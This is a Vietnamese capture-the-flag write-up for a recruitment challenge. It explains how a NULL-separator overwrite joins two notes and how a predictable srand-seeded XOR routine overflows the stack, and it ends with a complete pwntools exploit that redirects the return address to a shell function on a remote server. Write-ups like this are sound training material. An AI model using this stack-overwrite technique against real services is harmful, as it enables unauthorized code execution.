![](../../img/2026-1789394683019.webp)

![](../../img/2026-1789394695795.webp)

Bài này cho phép ta viết 0x20 bytes vào 1 cái note trong 0xa note, với mỗi cái note được ngăn cách với nhau bởi null byte

Sau đó, cái note của ta sẽ được đem đi qua 3 transformation và check để chạy vào 1 hàm win (fake)

![](../../img/2026-1789394821445.webp)

![](../../img/2026-1789394830549.webp)

![](../../img/2026-1789394850002.webp)

Phase 1 chuyển hóa đầu của note, trừ đi 0x20 vào ký tử đầu

Phase 2 tính lại len của a1, RỒI mới trừ đi 0x10 vào a1Ilen-1I, tức nếu ta làm sao để phần tử đầu tiên bằng 0x20, thì len ở đây sẽ trả về 0 và phase2 sẽ chỉnh sửa NULL byte ngăn cách 2 note, khiến cho ta có thể link 2 note với nhau

Phase 3 copy cái note của ta vào 1 chunk dc malloc rồi gắn vào đuôi của cái note copy môt đoạn string 

![](./Is%20this%20a%20rev%20chall_-1789439162697.webp)

note 1

![](./Is%20this%20a%20rev%20chall_-1789439216371.webp)

note 2 (đã qua phase 1 và byte thứ nhất tại 0x14d892c1 trở thành NULL)

![](./Is%20this%20a%20rev%20chall_-1789439275984.webp)

byte NULL phân cách 2 note đã bi patch thành 0xf0

![](./Is%20this%20a%20rev%20chall_-1789439314305.webp)

note 2 patch lại để 2 note nối tiếp

![](../../img/2026-1789395027230.webp)

Sau đó ans check sẽ cmpstring của ta và trả về Đúng/Sai, lưu ý là nó chỉ check 13 bytes đầu, nên ta chỉ cần thỏa mãn 13 bytes đầu là đủ để qua dc ans_chk 

![](../../img/2026-1789395116572.webp)

Trong hàm win mà ta chạy tới, cái process sẽ sử dụng 1 cái xor để encrypt các cái kí tự của ta lại để lấy flag(fake), nhưng cái encryption này sẽ ghi kết quả trên stack, nên giả định nếu ta có 1 xâu đủ dài, ta có thể ghi tới return address để có được 1 cái arbitary execution 

Đáng chú ý, process này sử dụng srand(0x539), tức dãy random dùng để xor chuỗi bytes là cố định,  cộng thêm bug nối xâu ở phase2, ta có đủ tài nguyên để xây một payload chuyển đổi stack tùy ý

![](./Is%20this%20a%20rev%20chall_-1789436042580.webp)

Vị trí ghi của function nằm ở 0x7ffe16f87cc0 và return address ở 0x7ffe16f87d18

Chú ý là v4 (count) và i (interator) cũng nằm trên stack (tại 0x7ffe16f87cf0 và 0x7ffe16f87cfc), nên ta cần giữ nguyên được giá trị của nó trên stack để ta không gập vấn đề về con trỏ trong quá trình ghi

![](./Is%20this%20a%20rev%20chall_-1789436232036.webp)

Ví dụ về stack sau khi ghi đè return address

![](../../img/2026-1789395239866.webp)

hàm win mà ta có thể nhảy tới để gọi shell

```
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./w1recruit_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe
context.log_level = "info"

def exec(r,idx,data):
    r.sendlineafter(b"Index >",str(idx).encode())
    r.sendlineafter(b"Answer >",data)

def exec_skip(r,idx):
    r.sendlineafter(b"Index >",str(idx).encode())
    r.sendafter(b"Answer >",b"\n")

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript="b *0x401514")
    else:
        r = remote(args.HOST or "45.122.249.68", int(args.PORT or 10364))

    return r


def build_payloads():
    # pulling srand from libc
    libc_runtime = CDLL(libc.path)
    libc_runtime.srand(0x539)

    length = 105
    random = [libc_runtime.rand() & 0xff for _ in range(length)]
    table = exe.read(0x402190, length)

    # original payload (pasted from gdb)
    source = bytearray.fromhex(
        "69206c6f7665207731636164656d7921203c3341414141414141414141414131"
        "f022424242424242424242424242424242cf6b37e06537af7f4444444444444434f0"
    )
    source += b"\0" * (length + 1 - len(source))

    dest = bytearray(b"A" * length)
    dest[0x30:0x38] = p64(length)       # strlen
    dest[0x3c:0x40] = p32(0x3c)         # counter
    dest[0x58:0x60] = p64(0x4017d5)     # win

    # preserving record2
    for i in range(0x61, 0x41, -1):
        source[i] = source[i + 1] ^ dest[i] ^ random[i] ^ table[i]
        if source[i] in (0, 0x0a) or (i == 0x61 and (source[i] + 0x10) & 0xff in (0, 0x0a)):
            dest[i] ^= 0x69
            source[i] = source[i + 1] ^ dest[i] ^ random[i] ^ table[i]

    # preserving record1
    for i in range(0x41, 0x21, -1):
        source[i] = source[i + 1] ^ dest[i] ^ random[i] ^ table[i]
        if source[i] in (0, 0x0a) or (i == 0x61 and (source[i] + 0x10) & 0xff in (0, 0x0a)):
            dest[i] ^= 0x69
            source[i] = source[i + 1] ^ dest[i] ^ random[i] ^ table[i]


    record1 = bytearray(source[0x21:0x41])
    record1[-1] = (record1[-1] + 0x10) & 0xff

    record2 = bytearray(source[0x42:0x62])
    record2[-1] = (record2[-1] + 0x10) & 0xff

    return bytes(record1), bytes(record2)


def main():
    r = conn()

    record1, record2 = build_payloads()

    exec(r, 0, b"\x89 love w1cademy! <3".ljust(0x20, b"A"))
    exec(r,1,b"\x20"+b"B"*0x19)
    exec(r, 1, record1)
    exec(r,2,b"\x20"+b"C"*0x19)
    exec(r, 2, record2)
    exec_skip(r,0)

    r.interactive()


if __name__ == "__main__":
    main()
```